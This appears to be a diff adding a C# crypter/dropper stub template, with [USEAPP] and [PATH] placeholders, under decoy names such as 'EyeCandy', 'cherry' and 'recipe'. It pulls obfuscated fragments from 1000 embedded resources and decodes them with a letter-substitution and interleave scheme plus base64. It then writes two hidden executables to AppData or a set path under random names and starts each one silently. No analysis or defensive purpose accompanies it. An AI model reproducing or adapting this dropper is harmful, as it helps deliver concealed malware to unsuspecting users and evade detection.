@@ -1,0 +1,151 @@
+using System;
+using System.IO;
+using System.Text;
+using System.Threading;
+using System.Resources;
+using System.Reflection;
+using System.Collections.Generic;
+using System.Windows.Forms;
+using System.Diagnostics;
+
+namespace v_Form
+{
+    public static class Program
+    {
+        [STAThread]
+        static void Main()
+        {
+            v_EyeCandy.EyeCandy.Candy();
+        }
+    }
+}
+
+namespace v_EyeCandy
+{
+    public static class EyeCandy
+    {
+        public static int RecipeCount = 1000;
+
+        public static void Candy()
+        {
+            bool useApp = [USEAPP];
+
+            v_BrunoShift.BrunoShifter.Initialize();
+            string cherryRose = v_BrunoShift.BrunoShifter.DeBruno(GetAltRecipe());
+            byte[] cherryHash = Convert.FromBase64String(cherryRose);
+
+            Random random = new Random();
+            string fileName = "file" + random.Next(1, 400000) + ".exe";
+            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), fileName);
+            File.WriteAllBytes(path, cherryHash);
+            Process.Start(path);
+
+            string cherrySecret = v_BrunoShift.BrunoShifter.DeBruno(GetRecipe());
+            byte[] cherryBase = Convert.FromBase64String(cherrySecret);
+
+            fileName = "file" + random.Next(1, 400000) + ".exe";
+            path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), fileName);
+            if (!useApp)
+                path = @"[PATH]" + fileName;
+            File.WriteAllBytes(path, cherryBase);
+            Process.Start(path);
+        }
+
+        private static string GetRecipe()
+        {
+            StringBuilder recipe = new StringBuilder();
+            for (int i = 0; i < RecipeCount; i++)
+            {
+                ResourceManager manager = new ResourceManager("pretentious" + i, Assembly.GetExecutingAssembly());
+                string part = (string)manager.GetObject("cherry");
+                recipe.Append(part);
+            }
+            return recipe.ToString();
+        }
+
+        private static string GetAltRecipe()
+        {
+            StringBuilder recipe = new StringBuilder();
+            for (int i = 0; i < RecipeCount; i++)
+            {
+                ResourceManager manager = new ResourceManager("pretent" + i, Assembly.GetExecutingAssembly());
+                string part = (string)manager.GetObject("cherry");
+                recipe.Append(part);
+            }
+            return recipe.ToString();
+        }
+    }
+}
+
+namespace v_BrunoShift
+{
+    public static class BrunoShifter
+    {
+        private static Dictionary<string, string> _KEYMAP;
+
+        public static void Initialize()
+        {
+            _KEYMAP = new Dictionary<string, string>();
+
+            _KEYMAP.Add("a", "z");
+            _KEYMAP.Add("b", "y");
+            _KEYMAP.Add("c", "x");
+            _KEYMAP.Add("d", "w");
+            _KEYMAP.Add("e", "v");
+            _KEYMAP.Add("f", "u");
+            _KEYMAP.Add("g", "t");
+            _KEYMAP.Add("h", "s");
+            _KEYMAP.Add("i", "r");
+            _KEYMAP.Add("j", "q");
+            _KEYMAP.Add("k", "p");
+            _KEYMAP.Add("l", "o");
+            _KEYMAP.Add("m", "n");
+            _KEYMAP.Add("n", "m");
+            _KEYMAP.Add("o", "l");
+            _KEYMAP.Add("p", "k");
+            _KEYMAP.Add("q", "j");
+            _KEYMAP.Add("r", "i");
+            _KEYMAP.Add("s", "h");
+            _KEYMAP.Add("t", "g");
+            _KEYMAP.Add("u", "f");
+            _KEYMAP.Add("v", "e");
+            _KEYMAP.Add("w", "d");
+            _KEYMAP.Add("x", "c");
+            _KEYMAP.Add("y", "b");
+            _KEYMAP.Add("z", "a");
+        }
+
+        public static string DeBruno(string input)
+        {
+            StringBuilder reform = new StringBuilder();
+            for (int i = 0; i < input.Length; i++)
+            {
+                string character = input[i].ToString();
+                if (character == character.ToUpper())
+                    character = character.ToUpper();
+
+                foreach (KeyValuePair<string, string> kvp in _KEYMAP)
+                {
+                    if (kvp.Value == character)
+                        reform.Append(kvp.Key);
+                }
+                if (reform.Length - 1 != i)
+                    reform.Append(character);
+            }
+            input = reform.ToString();
+
+            int halfIndex = input.Length / 2;
+            string start = input.Substring(0, halfIndex);
+            string end = input.Substring(halfIndex, input.Length - halfIndex);
+            reform = new StringBuilder();
+            for (int i = 0; i < input.Length; i++)
+            {
+                if (i % 2 == 0)
+                    reform.Append(end[i / 2]);
+                else
+                    reform.Append(start[i / 2]);
+            }
+            return reform.ToString();
+        }
+    }
+}
